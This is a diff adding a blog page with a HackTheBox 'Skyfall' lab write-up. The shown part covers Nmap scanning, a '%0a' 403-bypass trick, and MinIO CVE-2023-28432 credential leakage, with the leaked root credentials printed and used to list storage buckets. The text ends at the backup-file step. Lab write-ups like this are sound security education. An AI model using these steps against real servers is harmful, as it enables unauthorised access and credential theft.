@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/08/29/hackthebox-skyfall/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSkyfall is an insane-difficult linux machine on HackTheBox. It involves some 403 forbidden bypass that leads to the MinIO Cloud Storage hacking through CVE-2023-28432, later gaining access to">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Skyfall">
+<meta property="og:url" content="http://foued-saidi.tech/2024/08/29/Hackthebox-Skyfall/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSkyfall is an insane-difficult linux machine on HackTheBox. It involves some 403 forbidden bypass that leads to the MinIO Cloud Storage hacking through CVE-2023-28432, later gaining access to">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/web-app-80.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/demo.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/demo2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/demo3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/metrics.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/metrics2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/metrics3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/minio.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/minio2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/symlink-race.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/fopen-access.png">
+<meta property="article:published_time" content="2024-08-29T14:38:11.000Z">
+<meta property="article:modified_time" content="2024-08-31T13:51:50.906Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Skyfall/web-app-80.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Skyfall -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Skyfall</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-29 15:38:11</span>
+        <span class="mobile">2024-08-29 15:38:11</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-08-31 14:51:50</span>
+            <span class="mobile">2024-08-31 14:51:50</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Skyfall is an insane-difficult linux machine on HackTheBox. It involves some 403 forbidden bypass that leads to the MinIO Cloud Storage hacking through CVE-2023-28432, later gaining access to a HashiCorp vault that allows us to gain footold and our user flag. Finally some Symlink Race Condition to hijack the MOTD (Message Of The Day) feature on linux providing me with vault credentials to gain root access. It was fun!</p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\foued&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">35.111</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-08-29</span> <span class="number">16</span>:<span class="number">37</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2880</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">35.111</span></span><br><span class="line">Host is up (<span class="number">0.20</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">6</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">6570</span>f71247073a888e27e9cb445d10fb (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">74483307</span>b7889d320e3bec16aab4c8fe (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Skyfall - Introducing Sky Storage!</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.93</span>%E=<span class="number">4</span>%D=<span class="number">8</span>/<span class="number">29</span>%OT=<span class="number">22</span>%CT=<span class="number">1</span>%CU=<span class="number">36196</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">66</span>D095D</span><br><span class="line">OS:<span class="number">1</span>%P=i686<span class="literal">-pc-windows-windows</span>)SEQ(<span class="built_in">SP</span>=<span class="number">106</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>B%TI=Z%CI=Z%<span class="built_in">II</span>=I%TS=A</span><br><span class="line">OS:)SEQ(<span class="built_in">SP</span>=<span class="number">106</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>B%TI=Z%CI=Z%TS=D)SEQ(CI=Z%<span class="built_in">II</span>=I)OPS(O1=M54EST11NW</span><br><span class="line">OS:<span class="number">7</span>%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST</span><br><span class="line">OS:<span class="number">11</span>)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span></span><br><span class="line">OS:%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%S=O%A=S+%F=AS%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T2(<span class="built_in">R</span></span><br><span class="line">OS:=N)T3(<span class="built_in">R</span>=N)T4(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T5(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W</span><br><span class="line">OS:=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T6(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)</span><br><span class="line">OS:T7(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)U1(<span class="built_in">R</span>=Y%DF=N%T=<span class="number">40</span>%IPL=<span class="number">164</span>%U</span><br><span class="line">OS:N=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(<span class="built_in">R</span>=Y%DFI=N%T=<span class="number">40</span>%<span class="built_in">CD</span>=S)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 111/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">313.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">135.00</span> ms <span class="number">10.129</span>.<span class="number">35.111</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have OpenSSH running on port 22 and a web application exposed on port 80.</p>
+<h3 id="Web-Application-http-10-129-35-111"><a href="#Web-Application-http-10-129-35-111" class="headerlink" title="Web Application - http://10.129.35.111"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.35.111/" >http://10.129.35.111 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/web-app-80.png"
+                      alt="Web App Port 80"
+                ><figcaption>Web App Port 80</figcaption></figure></p>
+<p>Going down a bit we find a <code>try our demo</code> button that redirects us to <code>demo.skyfall.htb</code>, we go ahead and add that entry to <code>/etc/hosts</code>. </p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/demo.png"
+                      alt="Clients demo"
+                ><figcaption>Clients demo</figcaption></figure></p>
+<p>We navigate to <code>demo.skyfall.htb</code> and it provides us with a demo for some type of a storage with login credentials:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/demo2.png"
+                      alt="Sky Storage login"
+                ><figcaption>Sky Storage login</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/demo3.png"
+                      alt="Sky Storage dashboard"
+                ><figcaption>Sky Storage dashboard</figcaption></figure></p>
+<h3 id="MinIO-CVE-2023-28432"><a href="#MinIO-CVE-2023-28432" class="headerlink" title="MinIO - CVE-2023-28432"></a>MinIO - CVE-2023-28432</h3><p>Checking what I features I can abuse, I did not really find something exploitable. Nevertheless, the 403 http response code on <code>/metrics</code> seemed a bit interesting:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/metrics.png"
+                      alt="Metrics"
+                ><figcaption>Metrics</figcaption></figure></p>
+<p>Looking a bit closer at 403 (Frobidden) bypass techniques, I stumbled into <a class="link"   target="_blank" rel="noopener" href="https://irsyadsec.medium.com/bypass-403-response-code-by-adding-creative-string-irsyadsec-a6472c9010d0" >this blog post <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. And this <code>%0a</code> payload works! And we get access to <code>/metrics</code> endpoint:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/metrics2.png"
+                      alt="Metrics"
+                ><figcaption>Metrics</figcaption></figure></p>
+<p>Looking at the data in front of us, we find another subdomain that we did not discover prior: <code>http://prd23-s3-backend.skyfall.htb</code><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/metrics3.png"
+                      alt="Metrics"
+                ><figcaption>Metrics</figcaption></figure></p>
+<p>We go ahead and add that entry to our <code>/etc/hosts</code> file and access it:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/minio.png"
+                      alt="MinIO"
+                ><figcaption>MinIO</figcaption></figure></p>
+<p>I keep on getting a <code>Access Denied</code> message on my requests.<br>Looking back at <code>MinIO</code> I find an interesting <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-28432" >CVE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where MinIO leaks the <code>SECRET_KEY</code> and <code>MINIO_ROOT_PASSWORD</code>, knowing that MinIO is a <code>Multi-Cloud Object Storage framework</code>.<br>And judging from the info found on the <code>/metrics</code> endpoint, <code>http://prd23-s3-backend.skyfall.htb/</code> is likely to be the main minio url.</p>
+<p>The CVE consists of making a <code>POST</code> request to the <code>/minio/bootstrap/v1/verify</code> endpoint on the main MinIO URL, we do that and we get our leaks:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/minio2.png"
+                      alt="MinIO"
+                ><figcaption>MinIO</figcaption></figure></p>
+<p><code>&quot;MINIO_ROOT_USER&quot;:&quot;5GrE1B2YGGyZzNHZaIww&quot;</code><br><code>&quot;MINIO_ROOT_PASSWORD&quot;:&quot;GkpjkmiVmpFuL2d3oRx0&quot;</code></p>
+<p>Using the username and password I can now login to the cluster using the <code>MinIO Client</code>. <a class="link"   target="_blank" rel="noopener" href="https://min.io/docs/minio/linux/reference/minio-mc.html" >MinIO official Documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> helps a lot with that.</p>
+<p>First, I set up an alias <code>kujen</code> that points me to the MinIO server <code>http://prd23-s3-backend.skyfall.htb/</code>, then I can abuse the obtained credentials </p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ mc <span class="built_in">alias</span> <span class="built_in">set</span> kujen http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0                                                                                                                                     1 ⨯</span><br><span class="line">Added `kujen` successfully.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ mc <span class="built_in">ls</span> kujen --versions --recursive                                                              </span><br><span class="line">[2023-11-07 23:59:15 EST]     0B askyy/</span><br><span class="line">[2023-11-08 00:35:28 EST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf</span><br><span class="line">[2023-11-09 16:37:25 EST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-09 16:37:09 EST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-09 16:36:30 EST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz</span><br><span class="line">[2023-11-07 23:58:56 EST]     0B btanner/</span><br><span class="line">[2023-11-08 00:35:36 EST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf</span><br><span class="line">[2023-11-07 23:58:33 EST]     0B emoneypenny/</span><br><span class="line">[2023-11-08 00:35:56 EST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf</span><br><span class="line">[2023-11-07 23:58:22 EST]     0B gmallory/</span><br><span class="line">[2023-11-08 00:36:02 EST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf</span><br><span class="line">[2023-11-07 19:08:01 EST]     0B guest/</span><br><span class="line">[2023-11-07 19:08:05 EST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf</span><br><span class="line">[2023-11-07 23:59:05 EST]     0B jbond/</span><br><span class="line">[2023-11-08 00:35:45 EST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf</span><br><span class="line">[2023-11-07 23:58:10 EST]     0B omansfield/</span><br><span class="line">[2023-11-08 00:36:09 EST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf</span><br><span class="line">[2023-11-07 23:58:45 EST]     0B rsilva/</span><br><span class="line">[2023-11-08 00:35:51 EST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see a few backup files on <code>askyy</code>. Downloading the v2 backup file, we find some juicy data on <code>.bashrc</code> file:</p>
